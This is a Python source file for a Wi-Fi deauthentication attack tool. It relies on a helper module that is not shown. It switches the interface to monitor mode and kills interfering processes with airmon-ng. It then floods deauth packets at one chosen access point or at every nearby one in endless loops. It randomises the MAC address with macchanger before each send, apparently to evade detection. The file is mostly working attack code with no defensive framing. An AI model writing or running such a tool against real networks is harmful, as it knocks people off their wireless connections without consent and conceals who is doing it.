import subprocess
from wifi_utils import *
import sys


def prepare_attack():
	monitor_mode()
	kill_processes()


def send_AP_deauth(AP):
	pkt = AP.build_AP_deauth_pkt()
	print("Seding deauth packet to %s" % (AP.BSSID))
	sendp(pkt, iface=network.interface_name, verbose=False)


def deauth_AP(BSSID):
	interfaces = get_interfaces()
	iface = interfaces[0]  # we will use just one interface for now.
	iwlist_scan(iface)
	AP = network.get_AP(BSSID)
	set_channel(AP)
	prepare_attack()
	while 1:
		mac_changer()
		send_AP_deauth(AP)


def deauth_all(skip):
	interfaces = get_interfaces()
	iface = interfaces[0]  # we will use just one interface for now.
	iwlist_scan(iface)
	prepare_attack()
	while 1:
		for AP in network.APs:
			if AP.BSSID in skip:
				continue
			set_channel(AP)
			mac_changer()
			send_AP_deauth(AP)


def mac_changer():
	try:
		print("Changing MAC address on %s" % network.interface_name)
		subprocess.run(["ifconfig", network.interface_name, "down"],
		               check=True, capture_output=True)
		subprocess.run(["macchanger", "-r", network.interface_name],
		               check=True, capture_output=True)
		subprocess.run(["ifconfig", network.interface_name, "up"],
		               check=True, capture_output=True)
		network.set_interface_mac(((subprocess.check_output(
			("macchanger", "-s", network.interface_name)).decode().split("\n")[0])[15:32]).lower())
	except:
		raise subprocess.CalledProcessError("Error changing MAC address.")


def kill_processes():
    try:
        print("Killing processes that might interfer ...")
        subprocess.run(["airmon-ng", "check", "kill"],
                       check=True, capture_output=True)
    except subprocess.CalledProcessError:
        raise subprocess.CalledProcessError("Error killing processes.")


# deauth_AP("66:D1:54:56:02:34", "wlan0")

# managed_mode(["wlan0"])
# run_NetworkManeger()
